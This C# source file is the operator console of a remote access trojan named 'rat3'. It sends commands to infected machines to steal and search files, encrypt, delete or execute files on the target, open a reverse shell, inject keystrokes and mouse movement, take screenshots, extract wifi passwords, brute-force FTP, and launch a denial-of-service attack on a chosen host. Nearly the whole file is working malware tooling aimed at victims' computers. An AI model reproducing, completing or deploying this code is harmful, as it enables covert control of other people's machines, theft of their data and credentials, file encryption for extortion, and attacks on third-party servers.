using Protocol;

namespace rat3
{
    class Handle
    {
        public enum Commands
        {
            GetIp,
            ScanPort,
            FileHandler,
            ReverseShell,
            Controller,
            ScreenShot,
            WebPage,
            NetworkMenu,
            UserInfo,
        }

        public enum NetworkMenu
        {
            Dos,
            InterfaceInfo,  
            WifiPasswordExtract,
            FtpBrute


        }

        public enum FileHandlerEnum
        {
            FileLooker,
            FileStealer,
            FileSender,
            FileRemover,
            FileEncrypter,
            FileExecuter
        }


        /// <summary>
        /// handle's the commands.
        /// </summary>
        /// <param name="stream"></param>schtasks /query | find
        public void HandleClient(Stream stream)
        {
            var possibleComands = Enum.GetValues<Commands>();
            var fileHandler = Enum.GetValues<FileHandlerEnum>();
            var networkMenu = Enum.GetValues<NetworkMenu>();

            for (int i = 0; i < possibleComands.Length; i++)
            {
                Console.WriteLine($"{possibleComands[i]} - {i}");
            }

            var adminRights = stream.ReadString();
            Console.WriteLine(adminRights);

            while (true) 
            {
                Console.Write("[rat@command] enter an index: ");
                var indexString = Console.ReadLine();


                

                stream.WriteString(indexString);
                
                var commandSelected = possibleComands[int.Parse(indexString)];

                  switch (commandSelected)
                  {
                    case Commands.GetIp:
                        var ipRecv = stream.ReadString();
                        Console.WriteLine($"[~] public ip: {ipRecv}");
                        break;
                    case Commands.ScanPort:
                        Console.Write("[~] enter an ip to scan: ");
                        stream.WriteString(Console.ReadLine());

                        Console.Write("[~] enter a port to scan: ");
                        stream.WriteString(Console.ReadLine());


                        var scanPortRecv = stream.ReadString();
                        Console.WriteLine($"{scanPortRecv}");
                        break;
                    case Commands.FileHandler:
                        for (int i = 0; i < fileHandler.Length; i++)
                        {
                            Console.WriteLine($"{fileHandler[i]} - {i}");
                        }

                        Console.Write("[~] enter an index for the file handler: ");
                        var indexFile = Console.ReadLine();
                        stream.WriteString(indexFile);

                        var fileCommand = fileHandler[int.Parse(indexFile)];

                        switch (fileCommand)
                        {
                            case FileHandlerEnum.FileLooker:
                                Console.Write("[~] enter the path to look into: ");
                                var path = Console.ReadLine();
                                stream.WriteString(path);

                                Console.Write("[~] enter the extension for the files: ");
                                stream.WriteString(Console.ReadLine());


                                List<string> list = new List<string>();
                                FileHandler.FileServer(stream, list);

                                var usrName = Environment.UserName;
                                var rand23 = new Random();
                                var randFile = rand23.Next(2012311401);
                                var name = $"C:\\Users\\{usrName}\\info{randFile}.txt";

                                File.WriteAllText(name, "");
                                foreach(var item in list)
                                {
                                    File.AppendAllText(name, $"{item}\n");
                                }
                                Console.WriteLine($"file saved as {name}");

                                break;

                            case FileHandlerEnum.FileStealer:
                                Console.Write("[~] enter the path to the file you want to take: ");
                                var pathHandler = Console.ReadLine();

                                stream.WriteString(pathHandler);
                                FileStealer.WriteFile(stream);

                                break;

                            case FileHandlerEnum.FileSender:
                                Console.Write("[~] enter the path to the file: ");
                                var pathReceiver = Console.ReadLine();

                                Console.Write("[~] enter the path where the file needs to be written (including the name and extension): ");
                                stream.WriteString(Console.ReadLine());

                                stream.WriteBytes(File.ReadAllBytes(pathReceiver));

                                break;

                            case FileHandlerEnum.FileRemover:
                                Console.Write("[~] enter the path to the file you want to be removed in your target's computer: ");
                                stream.WriteString(Console.ReadLine());

                                break;

                            case FileHandlerEnum.FileEncrypter:
                                Console.Write("[~] enter the type of encryption: ");
                                var typeEncryption = Console.ReadLine();
                                stream.WriteString(typeEncryption);

                                if (typeEncryption == "simpleEncrypter")
                                {
                                    Console.Write("[~] enter the path to the file you want to encrypt: ");
                                    stream.WriteString(Console.ReadLine());
                                }
                                else if (typeEncryption == "compuseEncrypt")
                                {
                                    Console.Write("[~] enter the type: ");
                                    var typeCompuse = Console.ReadLine();
                                    stream.WriteString(typeCompuse);

                                    if (typeCompuse == "simple")
                                    {
                                        Console.Write("[~] enter the path to the file you want to start to encrypt: ");
                                        stream.WriteString(Console.ReadLine());

                                        Console.Write("[~] enter the extension to the file you want to encrypt: ");
                                        stream.WriteString(Console.ReadLine());
                                    }
                                    else if (typeCompuse == "selective")
                                    {
                                        Console.Write("[~] enter the path to the file you want to start to encrypt: ");
                                        stream.WriteString(Console.ReadLine());
                                    }

                                }

                                break;

                            case FileHandlerEnum.FileExecuter:
                                Console.Write("[~] enter the path in the target's computer for the file(including the name+extension): ");
                                stream.WriteString(Console.ReadLine());

                                break;
                            
                            default:
                                Console.WriteLine("");
                                break;
                        }

                        break;

                    case Commands.ReverseShell:
                        ReverseShellServer.ReverseShell(stream);

                        break;


                    case Commands.Controller:
                        Console.WriteLine("[0] - Keyboard Writer\n[1] - Mouse\n   [mouse-mover] - move the mouse position\n   [mouse-jiggler] - move the mouse for a certain amount of times in a random generated position\n");

                        Console.Write("[~] enter an index: ");
                        var controller = Console.ReadLine();
                        stream.WriteString(controller);

                        if (controller == "0")
                        {
                            Console.Write("[+] enter what you want to write in the target's computer: ");
                            stream.WriteString(Console.ReadLine());
                        } else if (controller == "1")
                        {
                            Console.Write("[+] enter an option: ");

                            var optionController = Console.ReadLine();

                            stream.WriteString(optionController); 

                            if (optionController == "mouse-mover")
                            {
                                Console.Write("[+] enter the x coordonate for the position of the mouse: ");
                                stream.WriteString(Console.ReadLine());

                                Console.Write("[+] enter the y coordonate for the position of the mouse: ");
                                stream.WriteString(Console.ReadLine());
                            } else if (optionController == "mouse-jiggler")
                            {
                                Console.Write("[+] how many times do you want for the mouse to change its position: ");
                                stream.WriteString(Console.ReadLine());
                            }

                        }
                        

                        break;
                    case Commands.ScreenShot:


                        Console.Write("[~] enter the path where you want your file to be saved: ");
                        var pathScreenShot = Console.ReadLine();


                        var rnd = new Random();
                        int number = rnd.Next(2012311401);

                        Console.WriteLine($"[+] the file will be named: ScreenShot_Received_ID{number}.jpeg");

                        var bytesFile = stream.ReadBytes();

                        File.WriteAllBytes($"{pathScreenShot}\\ScreenShot_Received_ID{number}.jpeg", bytesFile);


                        break;

                    case Commands.WebPage:

                        Console.Write("[~] enter the url you want to open: ");

                        stream.WriteString(Console.ReadLine());
                        

                        break;

                    case Commands.NetworkMenu:
                        for (int i = 0; i < networkMenu.Length; i++)
                        {
                            Console.WriteLine($"{networkMenu[i]} - {i}");
                        }
                        Console.Write("[~] enter an index for the network menu: ");
                        var indexNet = Console.ReadLine();

                        stream.WriteString(indexNet);
                       
                        var netCom = networkMenu[int.Parse(indexNet)];

                        switch (netCom)
                        {
                            case NetworkMenu.Dos:
                                Console.Write("[~] enter the hostaname(eg.romaniaquest.com): ");
                                stream.WriteString(Console.ReadLine());

                                Console.Write("[~] enter the path(eg. /climbing/): ");
                                stream.WriteString(Console.ReadLine());

                                Console.WriteLine("The attack is on going!");

                                break;
                            case NetworkMenu.InterfaceInfo:
                                Console.WriteLine(stream.ReadString());
                                Console.WriteLine(stream.ReadString());

                                break;
                            case NetworkMenu.WifiPasswordExtract:
                                Console.Write("[~] enter the wifi name in the targets pc: ");
                                stream.WriteString(Console.ReadLine());

                                Console.WriteLine(stream.ReadString());


                                break;

                        }

                        break;

                    case Commands.UserInfo:
                        var count = int.Parse(stream.ReadString());

                        
                        Console.WriteLine(stream.ReadString());
                        Console.WriteLine(stream.ReadString());
                        Console.WriteLine(stream.ReadString());
                        Console.WriteLine(stream.ReadString());
                        Console.WriteLine(stream.ReadString());
                        Console.WriteLine(stream.ReadString());
                        Console.WriteLine(stream.ReadString());
                        Console.WriteLine(stream.ReadString());
                        Console.WriteLine(stream.ReadString());

                        break;

                    default:
                        Console.WriteLine("");
                        break;
                }
            }

        }
    }
}
